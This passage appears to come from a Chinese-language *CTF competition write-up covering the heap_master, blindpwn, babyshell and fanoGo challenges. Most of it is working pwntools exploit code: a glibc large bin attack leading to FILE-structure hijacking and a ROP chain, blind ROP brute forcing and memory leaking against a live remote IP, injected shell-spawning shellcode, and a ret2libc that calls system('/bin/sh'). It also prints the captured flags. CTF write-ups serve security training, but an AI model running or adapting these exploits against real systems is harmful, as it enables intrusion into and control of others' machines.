    new(3,8,2)
    free(0)
    # gdb.attach(p,'c\n')
    show(0)
    p.send('\x90'*0x90 + asm(shellcraft.sh()))
    p.interactive()
### heap_master
**注意**
  * libc是2.25的
  * 远程没有bin目录，只能在程序内orw
**利用思路**  
large bin attack 修改`_IO_2_1_stdout_`，导致泄露，之后再次large bin
attack修改`_IO_list_all`获得一次任意地址call，从而将栈迁移到mmap的内存上，执行事先布置的ropchain
    from pwn import *
    context.update(os='linux', arch='amd64')
    def g(off):
        return libc.address + off
    def _add(p, size):
        p.sendlineafter('>> ', '1')
        p.sendlineafter('size: ', str(size))
    def _edit(p, off, cont):
        p.sendlineafter('>> ', '2')
        p.sendlineafter('offset: ', str(off))
        p.sendlineafter('size: ', str(len(cont)))
        p.sendafter('content: ', cont)
    def _del(p, off):
        p.sendlineafter('>> ', '3')
        p.sendlineafter('offset: ', str(off))
    def exploit(host, port=60001):
        if host:
            p = remote(host, port)
            guess = 0x40
        else:
            p = process('./heap_master', env={'LD_PRELOAD':libc_path})
            gdb.attach(p, 'source ./gdb.script')
            guess = int(raw_input('guess?'), 0x10) bk
        edit(offset+8+0x360+0x18, p64(0) + p16(stdout)) #p2->bk_nextsize
        free(offset+0x10+0x360+0x440) #p3
        add(0x90)
        p.recv(0x10)
        heap = u64(p.recv(8)) - 0x83c0
        info('heap @ '+hex(heap))
        libc.address = u64(p.recv(8)) - 0x39e5f0# + 0x1fe0
        info('libc.address @ '+hex(libc.address))
        # yet another large bin attack
        offset = 0x100
        edit(offset+8, p64(0x331)) #p1
        edit(offset+8+0x330, p64(0x31))
        edit(offset+8+0x360, p64(0x511)) #p2
        edit(offset+8+0x360+0x510, p64(0x31))
        edit(offset+8+0x360+0x540, p64(0x511)) #p3
        edit(offset+8+0x360+0x540+0x510, p64(0x31))
        edit(offset+8+0x360+0x540+0x540, p64(0x31))
        free(offset+0x10) #p1
        free(offset+0x10+0x360) #p2
        add(0x90)
        edit(offset+8+0x360, p64(0x4f1) + p64(0) + p64(libc.sym['_IO_list_all']-0x10) + p64(0) + p64(libc.sym['_IO_list_all']-0x20))
        free(offset+0x10+0x360+0x540) #p3
        add(0x200)
        # trigger on exit()
        pp_j = g(0x10fa54) # pop rbx ; pop rbp ; jmp rcx
        p_rsp_r = g(0x3870) # pop rsp ; ret
        p_rsp_r13_r = g(0x1fd94) # pop rsp ; pop r13 ; ret
        p_rdi_r = g(0x1feea) # pop rdi ; ret
        p_rdx_rsi_r = g(0xf9619) # pop rdx ; pop rsi ; ret
        fake_IO_strfile = p64(0) + p64(p_rsp_r) + p64(heap+8) + p64(0) + p64(0) + p64(p_rsp_r13_r)
        _IO_str_jump = p64(libc.address + 0x39A500)
        orw = [
            p_rdi_r, heap,
            p_rdx_rsi_r, 0, 0,      
            libc.sym['open'],
            p_rdi_r, 3,
            p_rdx_rsi_r, 0x100, heap+0x1337,
            libc.sym['read'],
            p_rdi_r, 1,
            p_rdx_rsi_r, 0x100, heap+0x1337,
            libc.sym['write'],
        ]
        edit(0, './flag\x00\x00' + flat(orw))
        edit(offset+0x360+0x540, fake_IO_strfile)
        edit(offset+0x360+0x540+0xD8, _IO_str_jump)
        edit(offset+0x360+0x540+0xE0, p64(pp_j))
        info('b *'+hex(pp_j))
        p.sendlineafter('>> ', '0')
        p.interactive()
    if __name__ == '__main__':
        libc_path = './lib/libc.so.6'
        libc = ELF(libc_path)
        exploit(args['REMOTE'])
### blindpwn
BROP
溢出偏移是40  
爆破可用的gadget
    from pwn import *
    # context.log_level = 'debug'
    padding = "a"*40
    def find_gadget(addr):
        fd = open("gadget.txt",'a')
        fd.write(hex(addr)+'\n')
        fd.close()
    for addr in range(0x400000,0x401AA0,0x1):
        p = remote("34.92.37.22",10000)
        p.recvuntil("pwn!\n")
        passwd = padding + p64(addr)
        log.info("now addr is " + hex(addr))
        p.sendline(passwd)
        try:
            msg = p.recvrepeat(9)
            if(msg!= ""):
                log.success("find addr" + hex(addr))
                print msg
                find_gadget(addr)
                addrs.append(addr)
            p.close()
        except EOFError as e:
            p.close()
            log.info("connection close at " + hex(addr))
    print addrs
leak 脚本↓
    from pwn import *
    context.update(os='linux', arch='amd64')
    def leak(off):
        p = remote('34.92.37.22', 10000)
        rop = [
            p_rdi_r, 0,
            p_rsi_r13_r, 0x400000+off, 0,
            0x400515,
        ]
        p.sendafter('pwn!\n', 'A'*40 + flat(rop))
        data = p.recv(0x100)
        p.close()
        return data
    if __name__ == '__main__':
        p_rdi_r = 0x40077a+9
        p_rsi_r13_r = 0x40077a+7
        for x in xrange(0, 0x1000, 0x100):
            fp = open('blind', 'a')
            fp.write(leak(x))
            fp.close()
拿到elf文件之后，直接找到几个可用的gadgets进行利用
    from pwn import *
    context.update(os='linux', arch='amd64')
    def v(x):
        return x+0x400000
    def exploit(host='34.92.37.22', port=10000):
        p = remote(host, port)
        rop = [
            p_rdi_r, 1,
            p_rsi_r15_r, 0x601018, 0,
            write_plt,
            p_rdi_r, 0,
            p_rsi_r15_r, 0x601030, 0,
            read_plt,
            p_rdi_r, 0x601038,
            v(0x550),
        ]
        p.sendafter('pwn!\n', 'A'*40 + flat(rop))
        write = u64(p.recv(8))
        setbuf = u64(p.recv(8))
        read = u64(p.recv(8))
        __libc_start_main = u64(p.recv(8))
        libc.address = read - libc.sym['read']
        info('libc @'+hex(libc.address))
        p.send(p64(libc.sym['system']) + '/bin/sh\x00')
        p.sendline('cat flag')
        p.interactive()
    if __name__ == '__main__':
        libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')
        write_plt = v(0x520)
        read_plt = v(0x540)
        p_rdi_r = v(0x783)
        p_rsi_r15_r = v(0x781)
        exploit()
    # *CTF{Qri2H5GjeaO1E9Jg6dmwcUvSLX8RxpI7}
### babyshell
    from pwn import *
    context.update(os='linux', arch='amd64')
    def exploit(host, port=10002):
        if host:
            p = remote(host, port)
        else:
            p = process('./shellcode')
            gdb.attach(p, '''
                b *0x00000000004008CB
                c
            ''')
        sc = asm('''
            pop rdx
            pop rdi
            pop rdi
            pop rdi
            pop rdi
            pop rdi
            pop rdi
            pop rdi
            pop rdi
            pop rdi
            syscall
        ''')
        p.sendafter('plz:', sc)
        p.send('\x90'*0x100 + asm(shellcraft.sh()))
        p.interactive()
    if __name__ == '__main__':
        exploit(args['REMOTE'])
    # *CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}
## RE
### fanoGo
程序逻辑：以corpus.txt的内容作为table，要求将输入经过fano.(*Fano).Decode后等于  
`If you cannot read all your books...fondle them---peer into them, let them
fall open where they will, read from the first sentence that arrests the eye,
set them back on the shelves with your own hands, arrange them on your own
plan so that you at least know where they are. Let them be your friends; let
them, at any rate, be your acquaintances.`
直接复用程序中的fano.(*Fano).Encode，将上面的数据编码得到密文
    from pwn import *
    context.update(os='linux', arch='amd64')
    # p = process('./fanoGo')
    p = remote('34.92.37.22', 10001)
    ans = [
    0x82c2b7c2bec3602b,
    0x2a87c25b95c389c2,
    0x6fbdc35196c21369,
    0x94c27492c35a2832,
    0xa4c296c295c294c2,
    0xb3c28ec3a3c28ac3,
    0x46aec2bac2242424,
    0x2332abc33cacc22b,
    0xc3acc2b3c3b0c32a,
    0xc26ba3c22c87c285,
    0xc3a8c25c87c30fad,
    0x12b9c3a1c3afc2b3,
    0x91c2a6c272448ac3,
    0x676451a7c3316d66,
    0x5191c296c26b7578,
    0x7b578ec3133ea7c3,
    0xc311297f459dc247,
    0x8ac259a7c3a1c395,
    0xfb5c291c28cc206,
    0xc38bc3bac28ec23a,
    0x718ec2bcc3a8c3aa,
    0x42b9c336326fbdc3,
    0xc3792292c349a7c3,
    0x6396c3795493c389,
    0x6f23b3c396c31f6a,
    0x76a8c394c23794c2,
    0xadc23f7c8ec383c3,
    0x7baac20c9fc2a0c3,
    0x7eb0c3adc22683c3,
    0x97f9dc247a5c33a,
    0xafc2b0c24449a5c3,
    0xbdc351508cc33a0f,
    0x49272d8cc32c326f,
    0xc2b3c3b0c32aa3c3,
    0xc2b0c389c288c3ac,
    0x4111299fc21c7e9d,
    0xc288c3bcc2b5c347,
    0xb8c2a2c3b0c3389a,
    0x5092c315a9c3,
    ]
    # gdb.attach(p, '''
    # b *0x000000000045C4F0
    # # command
    # # set $rip=0x000000000045C970
    # # fin
    # # end
    # c
    # ''')
    p.sendafter(':', flat(ans)[:0x136])
    p.interactive()
    # *CTF{NUY4a3E5D9186hVzejoyItr7xHBcmOpv}